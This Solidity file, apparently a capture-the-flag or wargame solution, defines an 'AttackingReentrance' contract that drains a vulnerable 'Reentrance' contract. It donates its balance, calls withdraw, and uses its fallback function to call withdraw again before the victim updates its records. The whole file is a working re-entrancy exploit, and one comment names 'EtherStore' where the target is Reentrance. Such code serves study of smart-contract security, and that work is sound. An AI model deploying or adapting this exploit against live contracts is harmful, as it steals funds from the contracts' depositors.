// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance public reentrance;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentrance = Reentrance(contractAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        // we are using re-entrancy here because we can withdraw twice before victim contract state is updated.
        // reference: https://solidity-by-example.org/hacks/re-entrancy
        reentrance.withdraw();
    }

    function hackContract() external {
        reentrance.donate{value: address(this).balance}(address(this));
        reentrance.withdraw();
    }
}
